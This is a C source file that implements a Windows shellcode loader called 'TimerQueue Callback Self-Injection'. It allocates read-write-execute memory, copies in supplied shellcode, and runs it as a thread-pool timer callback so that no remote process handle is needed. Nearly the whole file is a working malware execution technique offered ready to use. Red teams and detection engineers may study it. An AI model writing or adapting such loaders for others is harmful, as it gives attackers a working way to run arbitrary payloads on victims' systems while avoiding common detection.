/*
 *  TimerQueue Callback Self-Injection
 *
 *  Uses CreateTimerQueueTimer to dispatch shellcode as a callback
 *  on the Windows thread pool — entirely within the current process,
 *  no remote handle or process manipulation required.
 *
 *  Execution flow:
 *    1. Allocate RWX region and copy shellcode.
 *    2. Create a dedicated timer queue.
 *    3. Register a one-shot timer whose callback IS the shellcode.
 *       WT_EXECUTELONGFUNCTION prevents the pool from timing out.
 *    4. Sleep(INFINITE) — shellcode runs on a thread pool thread.
 */

#include <windows.h>
#include <string.h>

#include "functions.h"

BOOL TimerQueueInject(IN PBYTE pShellcode, IN SIZE_T sSizeOfShellcode) {

    /* 1. Allocate RWX memory in the current process */
    PVOID pExec = VirtualAlloc(NULL, sSizeOfShellcode,
                               MEM_COMMIT | MEM_RESERVE,
                               PAGE_EXECUTE_READWRITE);
    if (!pExec)
        return FALSE;

    memcpy(pExec, pShellcode, sSizeOfShellcode);

    /* 2. Create a dedicated timer queue */
    HANDLE hQueue = CreateTimerQueue();
    if (!hQueue) {
        VirtualFree(pExec, 0, MEM_RELEASE);
        return FALSE;
    }

    /*
     *  3. Register a one-shot timer at 100 ms due time.
     *     The shellcode address is cast directly to WAITORTIMERCALLBACK.
     *     WT_EXECUTELONGFUNCTION: the thread pool won't try to interrupt it.
     */
    HANDLE hTimer = NULL;
    if (!CreateTimerQueueTimer(&hTimer, hQueue,
                               (WAITORTIMERCALLBACK)pExec,
                               NULL, 100, 0,
                               WT_EXECUTEONLYONCE | WT_EXECUTELONGFUNCTION)) {
        DeleteTimerQueue(hQueue);
        VirtualFree(pExec, 0, MEM_RELEASE);
        return FALSE;
    }

    /* 4. Keep the main thread alive — shellcode owns its own threads from here */
    Sleep(INFINITE);
    return TRUE;
}
